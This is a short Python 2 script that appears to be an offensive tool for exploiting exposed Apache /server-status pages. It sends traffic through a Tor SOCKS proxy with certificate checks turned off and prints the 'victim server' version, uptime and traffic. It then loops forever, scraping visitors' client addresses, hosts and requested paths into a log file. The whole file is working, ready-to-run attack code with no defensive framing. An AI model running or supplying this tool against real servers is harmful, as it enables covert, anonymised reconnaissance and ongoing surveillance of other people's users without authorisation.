#!/usr/bin/env python2
#! coding:utf-8

import socks,socket
import requests, re
from random import randint
from time import sleep
import base64,sys
import random, string
from time import sleep


#socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
#socket.socket = socks.socksocket
proxy = dict(http='socks5://127.0.0.1:9150',
             https='socks5://127.0.0.1:9150')


class bot():

    def __init__(self,url):
        self.url=url
        self.s = requests.Session()
        self.s.headers = {'User-Agent': 'Mozilla/6.0'}
        self.s.verify=False
        self.s.proxies=proxy

    def check(self,response):
        if response == 200:
            return True
        else:
            return False

    def info(self):
        r = self.s.get(self.url+"/server-status")

        if self.check(r.status_code):
            print "This server-status maybe exist"
        else:
            print "This server not vulnerable"

        ver = re.findall("Version: ([^<>]*)", r.text)[0]
        uptime = re.findall("uptime: ([^<>]*)", r.text)[0]
        times = re.findall("Current Time: ([^<>]*)", r.text)[0]
        total = re.findall("Total accesses: ([0-9]*)", r.text)[0]
        trf = re.findall("Total Traffic: ([^<>]*)", r.text)[0]


        print "Version of victim server -- " + ver
        print "Uptime -- " + uptime
        print "Now on the server -- " + times
        print "Total requests from users -- " + total
        print "Total traffic -- " + trf


    def save(self,file="log.txt",timeout=10):
        while True:
            sleep(timeout)

            f = open(file,'a')

            r = self.s.get(self.url+"/server-status")

            rez = []

            strs = re.findall("td>.*nowrap>.*</td><td nowrap>.*</td></tr>", r.text)

            for i in strs:
                rd = re.findall("td><td>([^<>]*)", i)[0]
                rt = re.findall("td nowrap>([^<>]*)", i)

                st = rd + "---" + rt[1] + "--->" + rt[0] + '\n'
                print st
                f.write(st)

            f.close()

def main():
    url = sys.argv[1]
    file = sys.argv[2]

    try:
        b = bot(url)
        b.info()
    except:
        sys.exit()

    while True:
        try:
            b = bot(url)
            b.save(file)
        except KeyboardInterrupt:
            print "Ctrl+C exit"
            sys.exit()
        else:
            pass

if __name__ == "__main__":
    main()
